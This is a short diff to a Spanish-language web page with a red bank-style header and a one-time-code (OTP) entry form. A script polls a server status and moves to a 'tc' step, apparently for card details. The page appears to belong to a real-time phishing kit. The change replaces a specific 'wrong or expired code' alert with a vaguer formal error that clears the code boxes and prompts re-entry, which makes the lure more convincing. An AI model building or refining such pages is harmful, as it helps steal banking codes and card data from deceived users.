@@ -11,10 +11,12 @@
         /* --- ESTILOS BASE COMPARTIDOS --- */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
         body { display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        
         header { background-color: #E30613; display: flex; justify-content: space-between; align-items: center; padding: 0 40px 0 0; color: white; height: 85px; z-index: 10; }
         .logo-container { display: flex; align-items: center; height: 100%; cursor: pointer; text-decoration: none; }
         .logo-container img { height: 45px; margin-left: 60px; }
         .header-info { text-align: right; font-size: 14px; line-height: 1.4; padding-right: 40px; }
+
         main { flex-grow: 1; display: flex; flex-direction: column; justify-content: flex-start; align-items: center; text-align: center; position: relative; background-image: url('mujer.png'); background-size: cover; background-position: center top; background-repeat: no-repeat; color: white; padding: 60px 20px 20px 20px; }
         .content { position: relative; z-index: 2; display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 900px; transition: filter 0.4s ease, opacity 0.4s ease; }
         
@@ -148,7 +150,10 @@
                             clearInterval(interval);
                             document.getElementById('mainContent').classList.remove('blur-active');
                             document.getElementById('loadingOverlay').classList.remove('active');
-                            alert('Error: El código OTP es incorrecto o ha expirado. Intente de nuevo.');
+                            
+                            // MENSAJE DE ERROR FORMAL
+                            alert('Error de validación: No pudimos procesar su solicitud en este momento. Por favor, verifique sus datos e intente nuevamente.');
+                            
                             document.querySelectorAll('.otp-inputs input').forEach(input => input.value = '');
                             document.querySelector('.otp-inputs input').focus();
                         } else if (statusData.estado === 'tc') {
